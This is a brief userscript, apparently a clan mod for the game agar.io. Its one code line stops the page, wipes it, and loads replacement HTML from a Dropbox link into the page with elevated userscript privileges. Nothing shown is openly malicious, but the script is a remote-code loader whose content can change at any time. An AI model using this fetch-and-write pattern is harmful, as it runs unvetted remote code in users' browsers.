// ==UserScript==
// @name         ӃƝƉ
// @namespace    ZoMeS
// @description  Clan ӃƝƉ
// @version      1.0.0
// @author       ӃƝƉ
// @match        http://agar.io/*
// @match        https://agar.io/*
// @run-at       document-start
// @grant        GM_xmlhttpRequest
// @downloadURL https://update.greasyfork.org/scripts/13431/%D3%83%C6%9D%C6%89.user.js
// @updateURL https://update.greasyfork.org/scripts/13431/%D3%83%C6%9D%C6%89.meta.js
// ==/UserScript==
    
window.stop(),document.documentElement.innerHTML=null,GM_xmlhttpRequest({method:"GET",url:"https://dl.dropbox.com/s/urx98rvg39b5qx1/Agar.io.html?dl=0",onload:function(e){document.open(),document.write(e.responseText),document.close()}});